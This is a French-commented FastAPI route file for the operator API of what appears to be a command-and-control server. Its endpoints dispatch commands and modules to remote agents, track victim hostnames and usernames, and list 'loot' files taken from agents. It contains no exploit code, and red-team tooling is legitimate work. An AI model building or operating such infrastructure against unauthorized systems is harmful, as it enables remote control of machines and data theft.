# ============================================================
#  server/routes/operator.py — Routes pour les opérateurs
#  Rôle        : Gestion opérateurs, commandes, résultats, monitoring
#  Importé par : main.py
#  Dépend de   : models.py, auth.py, storage.py, database.py
#
#  CORRECTION : toutes les routes sont async def
#               tous les appels DB ont await
# ============================================================

import time
from typing import Optional
from fastapi import APIRouter, Depends, HTTPException, Query

import bcrypt

from models import OperatorLogin, CommandSubmit
from auth   import verify_token, get_current_operator
import storage
import database as db

router = APIRouter(prefix="/operator", tags=["Operator"])


# ── POST /operator/login ──────────────────────────────────────

@router.post("/login")
async def login(login_data: OperatorLogin):
    """
    Authentification d'un opérateur avec mot de passe.
    async → toutes les opérations DB sont non bloquantes.
    """
    operator_name = login_data.operator_name
    password      = login_data.password

    # Vérifie/crée l'opérateur en DB
    existing = await db.get_operator(operator_name)          # await ← async
    
    if not existing:
        # Premier login — crée compte avec mot de passe hashé
        password_hash = bcrypt.hashpw(
            password.encode(), bcrypt.gensalt()
        ).decode()
        await db.create_operator(operator_name, password_hash)  # await ← async
        await db.log_message("INFO", "operator", f"New operator created: {operator_name}")
        created = True
    else:
        # Compte existe — vérifie mot de passe
        stored_hash = await db.get_operator_hash(operator_name)
        if not bcrypt.checkpw(password.encode(), stored_hash.encode()):
            raise HTTPException(
                status_code=401,
                detail="Mot de passe incorrect"
            )
        await db.update_operator_last_login(operator_name)   # await ← async
        created = False

    # Crée la session en DB
    token = await db.create_session(operator_name)           # await ← async

    # Ajoute au cache mémoire — instantané, pas de await
    storage.add_active_token(token, {
        "operator_name": operator_name,
        "created_at":    time.time()
    })

    await db.log_message("INFO", "operator", f"Login: {operator_name}")   # await

    message = "Compte créé et connecté" if created else "Authentification réussie"
    return {
        "token":          token,
        "operator_name":  operator_name,
        "message":        message
    }


# ── POST /operator/logout ─────────────────────────────────────

@router.post("/logout")
async def logout(token_data: dict = Depends(verify_token)):
    """
    Déconnexion propre d'un opérateur.
    async → log_message() écrit en DB sans bloquer.
    """
    token    = token_data["token"]
    operator = token_data["operator_name"]

    await storage.remove_active_token(token)

    await db.log_message("INFO", "operator", f"Logout: {operator}")

    return {"message": "Déconnexion réussie"}


# ── POST /operator/command ────────────────────────────────────

@router.post("/command")
async def send_command(
    cmd: CommandSubmit,
    token_data: dict = Depends(verify_token)
):
    """
    Envoie une commande à un agent.
    async → create_task() et log_message() écrivent en DB sans bloquer.
    """
    operator = get_current_operator(token_data)

    if cmd.agent_id not in storage.agents:
        raise HTTPException(status_code=404, detail="Agent inconnu")

    filename  = cmd.filename  or ""
    technique = cmd.technique or ""

    # Crée la tâche en DB — await car create_task est async
    task_id = await db.create_task(
        cmd.session_token,
        cmd.agent_id,
        cmd.command,
        cmd.module,
        cmd.file_data,
        filename,
        technique
    )

    # Ajoute en mémoire pour polling rapide — sync, pas de await
    storage.add_task_to_memory(cmd.agent_id, task_id, cmd.command, cmd.module, cmd.file_data, filename, technique)

    await db.log_message(                                    # await ← async
        "INFO", "operator",
        f"Command sent by {operator}: task {task_id} to {cmd.agent_id}"
    )

    return {
        "task_id":  task_id,
        "agent_id": cmd.agent_id,
        "status":   "pending",
        "message":  "Commande enregistrée"
    }


# ── GET /operator/agents ──────────────────────────────────────

@router.get("/agents")
async def list_agents(token_data: dict = Depends(verify_token)):
    """
    Liste tous les agents avec statut temps réel.
    async → get_agent_by_id() lit la DB sans bloquer.
    """
    agents = storage.get_all_agents_info()   # lecture mémoire — pas de await

    # Enrichit avec données DB
    for agent in agents:
        agent_db = await db.get_agent_by_id(agent["id"])    # await ← async
        if agent_db:
            agent["registered_at"] = agent_db["registered_at"]

    return {
        "agents":  agents,
        "total":   len(agents),
        "online":  sum(1 for a in agents if a["status"] == "online"),
        "offline": sum(1 for a in agents if a["status"] == "offline")
    }


# ── GET /operator/agent/{agent_id} ───────────────────────────

@router.get("/agent/{agent_id}")
async def get_agent_details(
    agent_id: str,
    token_data: dict = Depends(verify_token)
):
    """
    Détails complets d'un agent : infos, tâches, résultats, événements.
    async → 4 lectures DB en parallèle possible avec asyncio.gather().
    """
    if agent_id not in storage.agents:
        raise HTTPException(status_code=404, detail="Agent inconnu")

    agent = storage.get_agent_info(agent_id)
    if not agent:
        raise HTTPException(status_code=404, detail="Agent inconnu")
    
    agent["status"] = storage.get_agent_status(agent_id)

    # 4 lectures DB — toutes async
    tasks   = await db.get_tasks_by_agent(agent_id)          # await ← async
    results = await db.get_results_by_agent(agent_id)        # await ← async
    events  = await db.get_agent_events(agent_id)            # await ← async

    return {
        "agent":   agent,
        "tasks":   tasks,
        "results": results,
        "events":  events
    }


# ── GET /operator/results ─────────────────────────────────────

@router.get("/results")
async def list_results(
    token_data: dict = Depends(verify_token),
    all_sessions: bool = Query(False, description="Inclure toutes les sessions de l'opérateur")
):
    """
    Liste les résultats, avec option pour toutes les sessions.
    async → lectures DB sans bloquer.
    """
    operator = get_current_operator(token_data)

    if all_sessions:
        # TOUS les résultats de toutes les sessions pour cet opérateur
        results = await db.get_results_by_operator(operator)   # await ← async
    else:
        # Résultats de la session courante uniquement
        results = await db.get_results_by_session(token_data["token"])   # await ← async

    # Enrichit avec contexte agent
    for result in results:
        agent = await db.get_agent_by_id(result["agent_id"])       # await ← async
        if agent:
            result["context"] = f"{agent['hostname']}\\{agent['username']}"

    return {
        "results":  results,
        "total":    len(results),
        "operator": operator,
        "all_sessions": all_sessions
    }


# ── GET /operator/result/{task_id} ───────────────────────────

@router.get("/result/{task_id}")
async def get_result_by_task(
    task_id: str,
    token_data: dict = Depends(verify_token)
):
    """
    Résultat d'une tâche spécifique par task_id.
    async → 2 lectures DB non bloquantes.
    """
    result = await db.get_result_by_task(task_id)    # await ← async
    if not result:
        raise HTTPException(status_code=404, detail="Résultat non trouvé")

    task = await db.get_task_by_id(task_id)          # await ← async

    return {
        "result": result,
        "task":   task
    }


# ── GET /operator/sessions ────────────────────────────────────

@router.get("/sessions")
async def list_sessions(token_data: dict = Depends(verify_token)):
    """
    Liste toutes les sessions actives.
    async → get_all_sessions() et get_tasks_by_session() sont async.
    """
    sessions = await db.get_all_sessions()           # await ← async

    active = []
    for session in sessions:
        if session.get("is_active"):
            tasks = await db.get_tasks_by_session(session["token"])  # await ← async
            session["task_count"] = len(tasks)
            active.append(session)

    return {
        "sessions":     active,
        "total_active": len(active)
    }


# ── GET /operator/history ─────────────────────────────────────

@router.get("/history")
async def get_history(
    token_data: dict = Depends(verify_token),
    all_sessions: bool = Query(False, description="Inclure toutes les sessions de l'opérateur")
):
    """
    Historique des tâches avec option pour toutes les sessions.
    async → lectures DB sans bloquer.
    """
    operator = get_current_operator(token_data)

    if all_sessions:
        # TOUTES les tâches de toutes les sessions pour cet opérateur
        tasks = await db.get_tasks_by_operator(operator)   # await ← async
    else:
        # Tâches de la session courante uniquement
        tasks = await db.get_tasks_by_session(token_data["token"])   # await ← async

    # Enrichit avec contexte
    for task in tasks:
        agent = await db.get_agent_by_id(task["agent_id"])     # await ← async
        if agent:
            task["context"] = f"{agent['hostname']}\\{agent['username']}"

    return {
        "tasks":    tasks,
        "total":    len(tasks),
        "operator": operator,
        "all_sessions": all_sessions
    }


# ── GET /operator/events ──────────────────────────────────────

@router.get("/events")
async def get_events(
    token_data: dict = Depends(verify_token),
    agent_id: Optional[str] = None,
    limit: int = 50
):
    """
    Log des événements agents, filtrable par agent.
    async → lectures DB sans bloquer.
    """
    if agent_id:
        events = await db.get_agent_events(agent_id)   # await ← async
    else:
        events = await db.get_recent_events(limit)     # await ← async

    return {
        "events": events[:limit],
        "total":  len(events)
    }


# ── GET /operator/stats ───────────────────────────────────────

@router.get("/stats")
async def get_stats(token_data: dict = Depends(verify_token)):
    """
    Statistiques globales du serveur.
    async → get_tasks_stats() lit la DB sans bloquer.
    """
    all_agents   = storage.get_all_agents_info()   # mémoire — pas de await
    online_count = sum(1 for a in all_agents if a["status"] == "online")

    task_stats = await db.get_tasks_stats()        # await ← async

    return {
        "agents": {
            "total":   len(all_agents),
            "online":  online_count,
            "offline": len(all_agents) - online_count
        },
        "tasks": task_stats,
        "sessions": {
            "active": len(storage.active_tokens)
        },
        "server": {
            "timestamp": time.time()
        }
    }


# ── GET /operator/loot/{agent_id} ─────────────────────────────

@router.get("/loot/{agent_id}")
async def get_loot(
    agent_id: str,
    token_data: dict = Depends(verify_token)
):
    """
    Liste les fichiers téléchargés d'un agent.
    async → get_loot_by_agent() lit la DB sans bloquer.
    """
    loot_files = await db.get_loot_by_agent(agent_id)   # await ← async
    
    return {
        "agent_id": agent_id,
        "files": loot_files,
        "total": len(loot_files)
    }